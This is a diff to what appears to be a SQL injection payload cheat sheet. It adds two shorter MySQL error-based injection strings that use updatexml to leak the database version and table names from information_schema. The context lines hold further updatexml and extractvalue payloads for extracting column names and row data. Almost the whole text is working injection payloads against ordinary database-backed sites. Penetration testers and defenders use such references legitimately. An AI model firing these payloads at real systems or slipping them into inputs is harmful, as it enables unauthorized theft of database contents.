@@ -33,6 +33,12 @@ AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126))
 AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
 ```
 
+Shorter to read:
+```
+' and updatexml(null,concat(0x0a,version()),null)-- -
+' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
+```
+
 ## MYSQL Error Based - Extractvalue function
 ```
 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
